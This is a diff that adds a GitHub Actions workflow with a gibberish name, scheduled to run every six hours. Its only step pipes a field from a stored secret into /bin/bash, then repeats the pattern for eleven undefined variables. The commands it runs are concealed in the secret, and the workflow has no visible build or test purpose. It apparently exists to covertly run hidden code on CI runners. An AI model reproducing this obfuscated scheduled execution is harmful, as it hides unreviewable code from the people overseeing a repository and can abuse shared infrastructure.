@@ -1,0 +1,28 @@
+name: manmandechilunn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: manmandechilunn
+        env:
+          sl1: ${{ secrets.sl1 }}
+        run: |
+          echo $sl1 | jq -r .gq84926 | /bin/bash
+          echo $lr3045 | jq -r .tp567 | /bin/bash
+          echo $yzxli0331 | jq -r .zic4 | /bin/bash
+          echo $j06 | jq -r .yic127 | /bin/bash
+          echo $fk7994 | jq -r .ehdtl98135 | /bin/bash
+          echo $g14705 | jq -r .hsng9845 | /bin/bash
+          echo $kza892 | jq -r .ydeg15 | /bin/bash
+          echo $zeaq61 | jq -r .rizlo5474 | /bin/bash
+          echo $xut98530 | jq -r .nyz1936 | /bin/bash
+          echo $z924 | jq -r .le644 | /bin/bash
+          echo $u35 | jq -r .kqxh569 | /bin/bash
+          echo $w88 | jq -r .fjvwj66 | /bin/bash
+
